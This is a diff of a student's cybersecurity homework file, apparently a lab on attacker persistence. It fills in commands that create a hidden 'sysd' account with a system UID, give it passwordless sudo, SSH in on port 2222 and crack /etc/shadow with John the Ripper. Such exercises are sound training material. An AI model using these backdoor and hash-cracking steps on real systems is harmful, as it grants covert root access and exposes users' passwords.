@@ -9,9 +9,9 @@ Save and submit the completed file for your homework submission.
 1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
 
 
-        sysadmin@UbuntuDesktop:~$sudo adduser --no-create-home sysd
+                root:~\ $ adduser --no-create-home sysd
 
-![create_user_no_home](image/add_user_no_home.png)
+![create_user_no_home](image/add_user_no_home2.png)
 
 
 
@@ -22,18 +22,19 @@ Save and submit the completed file for your homework submission.
 2. Give your secret user a password: 
 
 
-        sysadmin@UbuntuDesktop:~$ sudo passwd sysd
+        root:~\ $ passwd sysd
 
-![set_up_password](image/set_up_password.png)
+![set_up_password](image/set_up_password2.png)
 
 
 
 
 3. Give your secret user a system UID < 1000:
 
-        sysadmin@UbuntuDesktop:/etc$ sudo usermod -u 14 sysd
+                 root:~\ $ usermod -u 14 sysd
+       
 
-![change_UID](image/change_UID.png)
+![change_UID](image/change_group_GID2.png)
 
 
 
@@ -42,9 +43,10 @@ Save and submit the completed file for your homework submission.
 4. Give your secret user the same GID:
 
 
-        sysadmin@UbuntuDesktop:/etc$ sudo groupmod -g 14 sysd
+        root:~\ $ sudo groupmod -g 14 sysd
 
-![change_group_GID](image/change_group_GID2.png)
+
+![change_group_GID](image/change_group_GID3.png)
 
 
 
@@ -54,17 +56,22 @@ Save and submit the completed file for your homework submission.
         sysd ALL=(ALL) NOPASSWD:ALL
 
 
-![sudo_access_no_password](image/Sudo_access_without_password.png)
+![sudo_access_no_password](image\Sudo_access_without_password.png)
 
 
 
 6. Test that `sudo` access works without your password:
 
 
-        sysd@UbuntuDesktop:/$ sudo visudo
+        sysd@scavenger-hunt:/etc$ sudo visudo
 
 
-![Varifying](image/varifying.png)
+
+![No_password](image/verifying_root_access_wo_password%20.png)
+
+
+
+
 
 
 
@@ -102,20 +109,37 @@ root:ssh\ $ sudo systemctl reload ssh
 
 
 3. SSH to the target machine using your `sysd` account and port `2222`:
-    - `Your solution command here`
 
-4. Use `sudo` to switch to the root user:
-    - `Your solution command here`
+                ssh sysd@192.168.6.105 -p 2222
+
+
+![ssh_command_backintosystem](image/ssh_command_backintosystem.png)
+
+
+
+4. Use `sudo` to switch to the root user.
+
+
+                sysd@scavenger-hunt:~$ sudo -s
+
+![switch_user_to_root](image/switch_user_to_root.png)
+
+
 
 **Step 4: Crack All the Passwords**
 
 1. SSH back to the system using your `sysd` account and port `2222`:
 
-    - `Your solution command here`
+root@scavenger-hunt:~# ssh sysd@192.168.6.105 -p 2222
+
 
 2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
 
-    - `Your solution command here`
+                root@scavenger-hunt:/# sudo john shadow_copy
+
+![john_the ripper](image/John_the_ripper_hashtags.png)
+
+
 
 ---
 
